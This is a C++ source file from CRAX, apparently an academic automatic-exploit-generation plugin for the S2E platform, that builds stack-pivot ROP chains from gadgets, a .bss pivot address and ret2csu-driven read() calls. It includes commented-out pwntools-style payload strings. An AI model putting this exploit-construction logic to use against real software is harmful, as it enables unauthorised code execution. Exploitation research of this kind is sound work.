// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>

#include <cassert>

#include "StackPivot.h"

using namespace klee;

namespace s2e::plugins::crax {

using SymbolicRopPayload = Technique::SymbolicRopPayload;
using ConcreteRopPayload = Technique::ConcreteRopPayload;


BasicStackPivot::BasicStackPivot(CRAX &ctx) : StackPivot(ctx) {
    resolveRequiredGadgets();
}


bool BasicStackPivot::checkRequirements() const {
    // XXX: check if ROP gadgets exist.
    return true;
}

void BasicStackPivot::resolveRequiredGadgets() {
    // Gadgets
    m_ctx.getExploit().registerSymbol("ret", m_ctx.getExploit().resolveGadget("ret"));
    m_ctx.getExploit().registerSymbol("pop_rbp_ret", m_ctx.getExploit().resolveGadget("pop rbp ; ret"));
    m_ctx.getExploit().registerSymbol("leave_ret", m_ctx.getExploit().resolveGadget("leave ; ret"));

    // Memory locations
    m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
}

std::string BasicStackPivot::getAuxiliaryFunctions() const {
    return "";
}

std::vector<SymbolicRopPayload> BasicStackPivot::getSymbolicRopPayloadList() const {
    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
    assert(ret2csu);

    // RBP
    SymbolicRopPayload part1 = {
        ConstantExpr::create(0, Expr::Int64)};

    // Write the 2nd stage ROP payload via read() to `pivot_dest`
    // via ret2csu(read, 0, pivot_dest, 1024).
    SymbolicRopPayload part2 = ret2csu->getSymbolicRopPayloadList(
        BaseOffsetExpr::create(m_ctx.getExploit(), "sym", "read"),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
        ConstantExpr::create(1024, Expr::Int64))[0];

    // Perform stack pivoting.
    SymbolicRopPayload part3 = {
        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pop_rbp_ret"),
        BaseOffsetExpr::create(m_ctx.getExploit(), "", "pivot_dest"),
        BaseOffsetExpr::create(m_ctx.getExploit(), "", "leave_ret")};

    SymbolicRopPayload ret;
    ret.reserve(part1.size() + part2.size() + part3.size());
    ret.insert(ret.end(), part1.begin(), part1.end());
    ret.insert(ret.end(), part2.begin(), part2.end());
    ret.insert(ret.end(), part3.begin(), part3.end());
    return {ret};
}

ConcreteRopPayload BasicStackPivot::getExtraPayload() const {
    return {0};  // rbp
}

std::string BasicStackPivot::toString() const {
    return "BasicStackPivot";
}



AdvancedStackPivot::AdvancedStackPivot(CRAX &ctx) : StackPivot(ctx) {
    resolveRequiredGadgets();
}


bool AdvancedStackPivot::checkRequirements() const {
    const auto &sym = m_ctx.getExploit().getElf().symbols();
    return sym.find("read") != sym.end() &&
           m_ctx.getWritePrimitives().size() > 0;
}

void AdvancedStackPivot::resolveRequiredGadgets() {
    // Gadgets
    m_ctx.getExploit().registerSymbol("pop_rsi_r15_ret", m_ctx.getExploit().resolveGadget("pop rsi ; pop r15 ; ret"));

    // Memory locations
    m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
}

std::string AdvancedStackPivot::getAuxiliaryFunctions() const {
    return "";
}

std::vector<SymbolicRopPayload> AdvancedStackPivot::getSymbolicRopPayloadList() const {
    /*
    const std::vector<uint64_t> &writePrimitives = m_ctx.getWritePrimitives();
    assert(writePrimitives.size());

    // Resolve `ret2LeaRbp`.
    // XXX: from balsn: this is a good research topic.
    uint64_t ret2LeaRbp = writePrimitives.front() - determineOffset();
    m_ctx.getExploit().registerSymbol("ret2lea_rbp", ret2LeaRbp);

    std::vector<SymbolicRopPayload> ret = {
        {
            BaseOffsetExpr::create(m_ctx.getExploit(), "pivot_dest");
            BaseOffsetExpr::create(m_ctx.getExploit(), "ret2lea_rbp");
        }, {
            format("b'A' * %d", m_ctx.m_padding),
            format("p64(pivot_dest + 8 + %d)", m_ctx.m_padding),
            format("p64(0x%x)", ret2LeaRbp)
        }, {
            "p64(pop_rsi_r15_ret)            # ret",
            "p64(pivot_dest + 8 + 0x30 * 1)  # rsi",
            "p64(0)                          # r15 (dummy)",
            "p64(elf.sym['read'])            # ret",
            "p64(pop_rsi_r15_ret)            # ret",
            "p64(pivot_dest + 8 + 0x30 * 2)  # rsi"
        }, {
            "p64(0)                          # r15 (dummy)",
            "p64(elf.sym['read'])            # ret",
            "p64(pop_rsi_r15_ret)            # ret",
            "p64(pivot_dest + 8 + 0x30 * 3)  # rsi",
            "p64(0)                          # r15 (dummy)",
            "p64(elf.sym['read'])            # ret"
        }, {
            "p64(pop_rsi_r15_ret)            # ret",
            "p64(pivot_dest + 8 + 0x30 * 4)  # rsi",
            "p64(0)                          # r15 (dummy)",
            "p64(elf.sym['read'])            # ret",
            "p64(pop_rsi_r15_ret)            # ret",
            "p64(pivot_dest + 8 + 0x30 * 5)  # rsi"
        }, {
            "p64(0)                          # r15 (dummy)",
            "p64(elf.sym['read'])            # ret",
            "p64(pop_rsi_r15_ret)            # ret",
            "p64(pivot_dest + 8 + 0x30 * 6)  # rsi",
            "p64(0)                          # r15 (dummy)",
            "p64(elf.sym['read'])            # ret",
        }
    };

    Ret2csu *ret2csu = dynamic_cast<Ret2csu*>(Technique::mapper["Ret2csu"]);

    if (!ret2csu) {
        log<WARN>() << "StackPivot: unable to get ret2csu technique!\n";
    } else {
        std::vector<std::vector<std::string>> r = ret2csu->getRopPayloadList(
            "0",
            "pivot_dest + 8 + 0x30 * 7 - 8",
            "0x400",
            "elf.sym['read']"
        );

        ret.push_back(std::vector<std::string>(r[0].begin(), r[0].begin() + 6));
        ret.push_back(std::vector<std::string>(r[0].begin() + 6, r[0].begin() + 12));
        ret.push_back(std::vector<std::string>(r[0].begin() + 12, r[0].end()));
    }

    return ret;
    */
    return {};
}

ConcreteRopPayload AdvancedStackPivot::getExtraPayload() const {
    return {};
}

std::string AdvancedStackPivot::toString() const {
    return "AdvancedStackPivot";
}

uint64_t AdvancedStackPivot::determineOffset() const {
    uint64_t target = m_ctx.getWritePrimitives()[0];
    std::string symbol = m_ctx.getBelongingSymbol(target);
    log<WARN>() << hexval(target) << " is within " << symbol << "\n";

    std::vector<Instruction> insns = m_ctx.getDisassembler().disasm(symbol);
    uint64_t offset = 0;

    for (int i = insns.size() - 2; i >= 0; i--) {
        if (insns[i].opStr.find("rbp") != std::string::npos) {
            offset = target - insns[i].address;
            break;
        }
    }

    assert(offset);
    return offset;
}

}  // namespace s2e::plugins::crax
